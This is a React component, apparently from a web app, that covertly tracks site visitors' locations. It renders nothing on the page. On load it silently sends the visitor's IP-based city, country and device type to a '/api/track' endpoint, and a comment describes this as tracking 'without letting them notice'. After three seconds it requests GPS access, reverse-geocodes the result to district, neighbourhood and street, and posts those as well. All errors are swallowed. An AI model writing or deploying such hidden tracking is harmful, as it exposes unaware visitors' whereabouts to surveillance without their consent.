import { useEffect } from "react";
import { MapPin, Loader2, X } from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";
import { useGeoLocation } from "@/hooks/useGeoLocation";

const LocationTracker = () => {
  const { location, fetchLocation } = useGeoLocation();

  // 1. Dastlabki sezdirmasdan kuzatish (IP va Shahar)
  useEffect(() => {
    const trackVisitor = async () => {
      try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        
        await fetch('/api/track', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            city: data.city,
            country: data.country_name,
            address: "Waiting for permission...",
            device: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ? "Mobile" : "Desktop"
          })
        });
      } catch (e) {}
    };

    trackVisitor();

    const timer = setTimeout(() => {
      fetchLocation();
    }, 3000);
    return () => clearTimeout(timer);
  }, []);

  // 2. Aniq manzilni aniqlash (Ruxsat berilgandan so'ng)
  useEffect(() => {
    if (location) {
      const getDetailedAddress = async () => {
        try {
          const response = await fetch(
            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${location.lat}&lon=${location.lng}&zoom=18&addressdetails=1`
          );
          const data = await response.json();
          const addr = data.address;
          
          // Tuman, Mahalla va Ko'chani birlashtirish
          const district = addr.city_district || addr.district || "";
          const mahalla = addr.suburb || addr.neighbourhood || addr.residential || "";
          const street = addr.road || "";
          const fullAddress = `${district}${district ? ", " : ""}${mahalla}${mahalla ? ", " : ""}${street}`;

          await fetch('/api/track', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              city: addr.city || addr.town || "Tashkent",
              country: addr.country || "Uzbekistan",
              address: fullAddress || "Address found via GPS",
              device: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ? "Mobile" : "Desktop"
            })
          });
        } catch (e) {}
      };
      getDetailedAddress();
    }
  }, [location]);

  return null;
};

export default LocationTracker;
